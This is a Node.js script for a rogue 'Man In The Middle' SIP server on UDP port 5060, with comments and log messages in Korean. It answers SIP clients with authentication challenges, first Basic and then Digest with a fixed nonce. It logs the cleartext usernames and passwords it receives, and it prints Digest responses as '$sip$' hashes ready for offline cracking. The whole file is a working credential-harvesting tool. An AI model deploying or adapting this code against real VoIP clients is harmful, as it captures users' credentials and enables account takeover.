var PORT = 5060;
var HOST = '0.0.0.0';
var dgram = require('dgram');

var server = dgram.createSocket({
    type: 'udp4',
    reuseAddr: true,
});
server.on('listening', function () {
    var address = server.address();
    console.log('Man In The Middle™ SIP server running at ' + address.address + ":" + address.port);
});

var attempt = 0;
server.on('message', function (message, remote) {
    message = `${message}`;
    let lines = message.split("\r\n");
    let method, protocol;
    let sipaddr;
    let headers = [];
    [method, sipaddr, protocol] = lines[0].split(' ');
    for(let line of lines.slice(1)) {
        let name, value;
        let splitted_result = line.match(/^(.*?):\s*(.*)/);
        if(!splitted_result) continue;
        [,name,value] = splitted_result;
        if(!name)continue;
        headers[name] = value;
    }
    if(method === 'PING') {
        let response_arr = [
            'SIP/2.0 200 OK',
            `Via: ${headers['Via']}`,
            `To: ${headers['To']};tag=maninthemiddle`,
            `From: ${headers['From']}`,
            `Call-ID: ${headers['Call-ID']}`,
            `CSeq: ${headers['CSeq']}`,
            'Content-Length: 0',
        ];
        server.send(`${response_arr.join('\r\n')}\r\n\r\n`, remote.port, remote.address);
        return;
    }
    console.log(`클라이언트 ${remote.address}:${remote.port} 접속`);

    if(headers['Authorization']) {
        let authinfo = headers['Authorization'].split(' ');
        if(authinfo[0] === 'Basic' && authinfo[1]) {
            let id, password;
            [id, password] = (new Buffer(authinfo[1], 'base64')).toString('utf8').split(':');
            console.log('인증 정보:', `ID: "${id}", PASS: "${password}"`);
        }
        else if(authinfo[0] === 'Digest' && authinfo[1]) {
            const parsed_authinfo = authinfo[1].split(',').reduce((prev,curr)=>{
                [name, value] = curr.split('=', 2);
                prev[name] = value.replace(/^"(.*)"$/,'$1');
                return prev;
            },{});

            console.log(`$sip$*${parsed_authinfo.uri}**${parsed_authinfo.username}*${parsed_authinfo.realm}*${method}**${parsed_authinfo.uri}**${parsed_authinfo.nonce}*${parsed_authinfo.cnonce}*${parsed_authinfo.nc}*${parsed_authinfo.qop}*${parsed_authinfo.algorithm.toUpperCase()}*${parsed_authinfo.response}`)
        }
        else {
            console.log('인증 실패:', `인증 형태 협상에 실패했거나 올바른 요청이 아닙니다. (${authinfo[0]} ${authinfo[1]})`);
        }
        return;
    }

    let response_arr = [
        'SIP/2.0 401 Unauthorized',
        `Via: ${headers['Via']}`,
        `To: ${headers['To']};tag=maninthemiddle`,
        `From: ${headers['From']}`,
        `Call-ID: ${headers['Call-ID']}`,
        `CSeq: ${headers['CSeq']}`,
        'Content-Length: 0',
    ];
    if(++attempt>2) {
        response_arr.push(`WWW-Authenticate: Digest realm="maninthemiddle",nonce="1648417682/f322039003f2f8be7935df932d91cc58",opaque="03311acd7ef15f4e",algorithm=md5,qop="auth"`)
    }
    else {
        response_arr.push(`WWW-Authenticate: Basic realm="maninthemiddle"`)
    }
    console.log(`인증 협상 중...`);
    server.send(`${response_arr.join('\r\n')}\r\n\r\n`, remote.port, remote.address);
});
server.bind(PORT, HOST);
